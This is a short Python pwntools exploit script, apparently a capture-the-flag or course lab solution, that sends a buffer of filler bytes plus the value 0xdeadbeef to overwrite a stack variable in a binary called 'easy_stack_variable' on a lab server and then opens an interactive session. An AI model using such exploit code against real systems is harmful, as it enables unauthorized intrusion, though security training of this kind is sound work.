from pwn import *

local = False
elf = 'easy_stack_variable' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me"
    port = 6001
    r = remote(ip,port)

context.arch = 'amd64'

val = p64(0xdeadbeef)
payload = 'AAA%AAsAAB' + val

r.recvuntil(':')
r.sendline(payload)
r.interactive()
